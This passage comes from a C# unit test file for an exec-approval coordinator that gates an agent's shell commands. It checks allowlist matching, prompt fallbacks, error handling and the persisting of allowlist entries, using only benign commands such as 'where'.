        Assert.True(AlwaysCanPresentEvaluator.Instance.CanPresent(null));
        Assert.True(AlwaysCanPresentEvaluator.Instance.CanPresent("session-key"));
    }

    // ── 22. Empty correlationId → auto-generated 32-char hex ─────────────────

    [Fact]
    public async Task EmptyCorrelationId_AutoGeneratedInLog()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"deny"}}""");
        var log = new CapturingLogger();
        await MakeCoordinator(logger: log).HandleAsync(DefaultReq(), "");

        Assert.NotNull(log.LastWarn);
        // log format: "[EXEC-APPROVALS] [<correlationId>] path=new ..."
        // auto-generated correlationId: Guid.NewGuid().ToString("N") → 32 hex chars
        var msg = log.LastWarn!;
        var second = msg.IndexOf('[', msg.IndexOf(']') + 1) + 1;
        var end = msg.IndexOf(']', second);
        Assert.True(end > second);
        var id = msg[second..end];
        Assert.Equal(32, id.Length);
        Assert.True(id.All(c => char.IsAsciiHexDigit(c)), $"Expected 32 hex chars, got: {id}");
    }

    // ── 23. FallbackDecision(Allowlist, unsatisfied) → Deny ──────────────────

    [Fact]
    public async Task FallbackDecision_AskFallbackAllowlist_NotSatisfied_ReturnsDeny()
    {
        // security=full, ask=always → RequiresPrompt in pass1
        // canPresent=false → FallbackDecision(context, ExecSecurity.Allowlist)
        // AllowlistSatisfied=false (security=Full, not Allowlist) → Deny
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always","askFallback":"allowlist"}}""");
        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c23");
        Assert.False(result.IsAllow);
    }

    [Fact]
    public async Task FallbackDecision_AskFallbackAllowlist_Matched_ReturnsAllow()
    {
        WriteStoreFile("""
        {
          "version": 1,
          "defaults": { "security": "full", "ask": "always", "askFallback": "allowlist" },
          "agents": { "main": { "allowlist": [{ "pattern": "**/where.exe" }] } }
        }
        """);

        var result = await MakeCoordinator().HandleAsync(
            Req("""{"command":["where.exe","cmd.exe"]}"""),
            "c23-match");

        Assert.True(result.IsAllow);
    }

    [Fact]
    public async Task FallbackDecision_FullFallback_DoesNotBypassAllowlistSecurity()
    {
        WriteStoreFile("""
        {
          "version": 1,
          "defaults": { "security": "allowlist", "ask": "always", "askFallback": "full" }
        }
        """);

        var result = await MakeCoordinator().HandleAsync(DefaultReq(), "c23-clamp");

        Assert.False(result.IsAllow);
        Assert.Equal(ExecApprovalV2Code.UserDenied, result.Code);
    }

    // ── 24. Outer safety net — CanPresent throws → InternalError, not exception ───

    [Fact]
    public async Task CanPresent_Throws_ReturnsInternalError_NotException()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var log = new CapturingLogger();
        var result = await MakeCoordinator(
            canPresent: new ThrowingCanPresentEvaluator(),
            logger: log).HandleAsync(DefaultReq(), "outer-1");

        Assert.Equal(ExecApprovalV2Code.InternalError, result.Code);
        Assert.Equal("unexpected-exception", result.Reason);
        Assert.Contains(log.Errors, e => e.Contains("unexpected-exception"));
    }

    // ── PR8: allowlist persistence and use recording ──────────────────────────

    // A. AllowAlways + security=allowlist → entry persisted in store.
    [Fact]
    public async Task AllowAlways_Allowlist_PersistsEntry()
    {
        WriteStoreFile("""{"version":1,"agents":{"main":{"security":"allowlist","ask":"always"}}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(Req("""{"command":["where"]}"""), "pr8-A");

        Assert.True(result.IsAllow);
        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Single(resolved.Allowlist);
        Assert.NotNull(resolved.Allowlist[0].Pattern);
        Assert.Contains("where", resolved.Allowlist[0].Pattern, StringComparison.OrdinalIgnoreCase);
    }

    // B. AllowAlways + security=full → guard fails, no allowlist entry written.
    [Fact]
    public async Task AllowAlways_SecurityFull_DoesNotPersist()
    {
        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways))
            .HandleAsync(Req("""{"command":["where"]}"""), "pr8-B");

        Assert.True(result.IsAllow);
        var json = File.ReadAllText(Path.Combine(_dir, "exec-approvals.json"));
        Assert.DoesNotContain("allowlist", json, StringComparison.OrdinalIgnoreCase);
    }

    // C. Pre-approved path (pass1 = Allow) → RecordAllowlistUse fires and updates LastUsedAt.
    [Fact]
    public async Task AllowPreapproved_RecordsAllowlistUse()
    {
        WriteStoreFile("""
        {
          "version": 1,
          "agents": {
            "main": {
              "security": "allowlist",
              "ask": "off",
              "allowlist": [{ "pattern": "**/where.exe" }]
            }
          }
        }
        """);
        var result = await MakeCoordinator().HandleAsync(Req("""{"command":["where"]}"""), "pr8-C");

        Assert.True(result.IsAllow);
        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Single(resolved.Allowlist);
        Assert.NotNull(resolved.Allowlist[0].LastUsedAt);
    }

    // D. AllowOnce → persistAllowlistEntry=false, no entry written.
    [Fact]
    public async Task AllowOnce_DoesNotPersistEntry()
    {
        WriteStoreFile("""{"version":1,"agents":{"main":{"security":"allowlist","ask":"always"}}}""");
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(Req("""{"command":["where"]}"""), "pr8-D");

        Assert.True(result.IsAllow);
        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Empty(resolved.Allowlist);
    }

    // E. AllowAlways called twice for the same command → exactly one entry (dedup in store).
    [Fact]
    public async Task AllowAlways_Idempotent_SingleEntry()
    {
        WriteStoreFile("""{"version":1,"agents":{"main":{"security":"allowlist","ask":"always"}}}""");
        var coordinator = MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways));

        await coordinator.HandleAsync(Req("""{"command":["where"]}"""), "pr8-E1");
        await coordinator.HandleAsync(Req("""{"command":["where"]}"""), "pr8-E2");

        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Single(resolved.Allowlist);
    }

    // F. Prompt path (ask=always + AllowlistSatisfied=true + AllowOnce) →
    //    RecordAllowlistUse fires in the post-pass2 branch (not just the pass1 branch).
    [Fact]
    public async Task AllowOnce_AllowlistSatisfied_RecordsUseInPostPass2Branch()
    {
        WriteStoreFile("""
        {
          "version": 1,
          "agents": {
            "main": {
              "security": "allowlist",
              "ask": "always",
              "allowlist": [{ "pattern": "**/where.exe" }]
            }
          }
        }
        """);
        var result = await MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce))
            .HandleAsync(Req("""{"command":["where"]}"""), "pr8-F");

        Assert.True(result.IsAllow);
        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Single(resolved.Allowlist);
        Assert.NotNull(resolved.Allowlist[0].LastUsedAt);
    }

    // G. Fallback path (canPresent=false) + AllowlistSatisfied=true → RecordAllowlistUse fires.
    [Fact]
    public async Task Fallback_AllowlistSatisfied_RecordsUse()
    {
        // askFallback=off → FallbackDecision=AllowOnce → pass2=Allow. AllowlistSatisfied=true
        // because where.exe resolves and **/where.exe matches. RecordAllowlistUsageAsync must fire.
        WriteStoreFile("""
        {
          "version": 1,
          "agents": {
            "main": {
              "security": "allowlist",
              "ask": "always",
              "askFallback": "off",
              "allowlist": [{ "pattern": "**/where.exe" }]
            }
          }
        }
        """);
        // canPresent=false (default) → fallback path; askFallback=off → AllowOnce → Allow
        var result = await MakeCoordinator().HandleAsync(Req("""{"command":["where"]}"""), "pr8-G");

        Assert.True(result.IsAllow);
        var resolved = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Single(resolved.Allowlist);
        Assert.NotNull(resolved.Allowlist[0].LastUsedAt);
    }

    // End-to-end coordinator/store runtime proof using real filesystem I/O.
    // Demonstrates the two side-effect paths via ITestOutputHelper, so the
    // resulting JSON appears in `dotnet test ... --logger "console;verbosity=detailed"`:
    //   - AllowAlways persists a new allowlist entry into exec-approvals.json
    //   - A later allowlist hit records lastUsed* metadata
    [Fact]
    public async Task RuntimeProof_AllowAlways_PersistsAndRecordsLastUsed()
    {
        var filePath = Path.Combine(_dir, "exec-approvals.json");

        WriteStoreFile("""{"version":1,"agents":{"main":{"security":"allowlist","ask":"always"}}}""");
        _output.WriteLine("=== Initial exec-approvals.json ===");
        _output.WriteLine(File.ReadAllText(filePath));

        var coordinator = MakeCoordinator(
            canPresent: AlwaysCanPresentEvaluator.Instance,
            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowAlways));

        // Step 1: AllowAlways → entry persisted (no lastUsed* yet).
        var first = await coordinator.HandleAsync(Req("""{"command":["where"]}"""), "proof-1");
        Assert.True(first.IsAllow);

        _output.WriteLine("");
        _output.WriteLine("=== After AllowAlways (correlationId=proof-1) ===");
        _output.WriteLine(File.ReadAllText(filePath));

        // Step 2: Same command again → allowlist hit, lastUsed* recorded.
        var second = await coordinator.HandleAsync(Req("""{"command":["where"]}"""), "proof-2");
        Assert.True(second.IsAllow);

        _output.WriteLine("");
        _output.WriteLine("=== After allowlist hit (correlationId=proof-2) ===");
        _output.WriteLine(File.ReadAllText(filePath));

        var resolvedAfter = new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main");
        Assert.Single(resolvedAfter.Allowlist);
        Assert.NotNull(resolvedAfter.Allowlist[0].Pattern);
        Assert.NotNull(resolvedAfter.Allowlist[0].LastUsedAt);
        Assert.NotNull(resolvedAfter.Allowlist[0].LastResolvedPath);
    }

    // Regression: wildcard-authorized hit must record lastUsed* on the wildcard bucket entry.
    // ResolveReadOnly merges agents["*"] into the resolved allowlist for any concrete agent,
    // so a request from "main" can be allow-matched by an entry living under "*". The store's
    // record path must follow the same source — otherwise wildcard-authorized executions never
    // accumulate usage metadata.
    [Fact]
    public async Task WildcardAllowlistHit_RecordsUseOnWildcardBucketEntry()
    {
        WriteStoreFile("""
        {
          "version": 1,
          "agents": {
            "*": {
              "security": "allowlist",
              "ask": "off",
              "allowlist": [{ "pattern": "**/where.exe" }]
            }
          }
        }
        """);

        var result = await MakeCoordinator().HandleAsync(Req("""{"command":["where"]}"""), "wildcard-1");

        Assert.True(result.IsAllow);
        var json = File.ReadAllText(Path.Combine(_dir, "exec-approvals.json"));
        Assert.Contains("\"lastUsedAt\"", json);
        Assert.Contains("\"lastResolvedPath\"", json);
    }

    // ── Test doubles ──────────────────────────────────────────────────────────

    private sealed class FixedDecisionPromptHandler : IExecApprovalV2PromptHandler
    {
        private readonly ExecApprovalPromptOutcome _outcome;
        public FixedDecisionPromptHandler(ExecApprovalPromptOutcome o) => _outcome = o;
        public Task<ExecApprovalPromptOutcome> PromptAsync(
            ExecApprovalV2PromptRequest _,
            CancellationToken cancellationToken = default)
            => Task.FromResult(_outcome);
    }

    private sealed class CapturingPromptHandler : IExecApprovalV2PromptHandler
    {
        private readonly ExecApprovalPromptOutcome _outcome;
        public CapturingPromptHandler(ExecApprovalPromptOutcome o) => _outcome = o;
        public ExecApprovalV2PromptRequest? Captured { get; private set; }
        public Task<ExecApprovalPromptOutcome> PromptAsync(
            ExecApprovalV2PromptRequest request,
            CancellationToken cancellationToken = default)
        {
            Captured = request;
            return Task.FromResult(_outcome);
        }
    }

    // Simulates the node owner tightening the policy while the approval prompt is open by
    // running a mutation before returning the decision.
    private sealed class StoreMutatingPromptHandler : IExecApprovalV2PromptHandler
    {
        private readonly Action _mutate;
        private readonly ExecApprovalPromptOutcome _outcome;
        public StoreMutatingPromptHandler(Action mutate, ExecApprovalPromptOutcome o)
        {
            _mutate = mutate;
            _outcome = o;
        }
        public Task<ExecApprovalPromptOutcome> PromptAsync(
            ExecApprovalV2PromptRequest _,
            CancellationToken cancellationToken = default)
        {
            _mutate();
            return Task.FromResult(_outcome);
        }
    }

    // Never resolves on its own; only the coordinator's prompt-timeout token ends the wait,
    // then it denies (mirroring the real dialog's cancellation-to-Deny behavior).
    private sealed class TokenAwaitingPromptHandler : IExecApprovalV2PromptHandler
    {
        public async Task<ExecApprovalPromptOutcome> PromptAsync(
            ExecApprovalV2PromptRequest _,
            CancellationToken cancellationToken = default)
        {
            try { await Task.Delay(Timeout.Infinite, cancellationToken).ConfigureAwait(false); }
            catch (OperationCanceledException) { }
            return ExecApprovalPromptOutcome.Deny;
        }
    }

    private sealed class ThrowingCanPresentEvaluator : ICanPresentEvaluator
    {
        public bool CanPresent(string? requestSessionKey)
            => throw new InvalidOperationException("simulated canPresent crash");
    }

    private sealed class ThrowingPromptHandler : IExecApprovalV2PromptHandler
    {
        public Task<ExecApprovalPromptOutcome> PromptAsync(
            ExecApprovalV2PromptRequest _,
            CancellationToken cancellationToken = default)
            => throw new InvalidOperationException("simulated presenter crash");
    }

    private sealed class CapturingLogger : IOpenClawLogger
    {
        public List<string> Infos { get; } = [];
        public List<string> Warns { get; } = [];
        public List<string> Errors { get; } = [];
        public string? LastInfo => Infos.Count > 0 ? Infos[^1] : null;
        public string? LastWarn => Warns.Count > 0 ? Warns[^1] : null;
        public string? LastError => Errors.Count > 0 ? Errors[^1] : null;
        public void Info(string m) => Infos.Add(m);
        public void Debug(string m) { }
        public void Warn(string m) => Warns.Add(m);
        public void Error(string m, Exception? _ = null) => Errors.Add(m);
    }

}
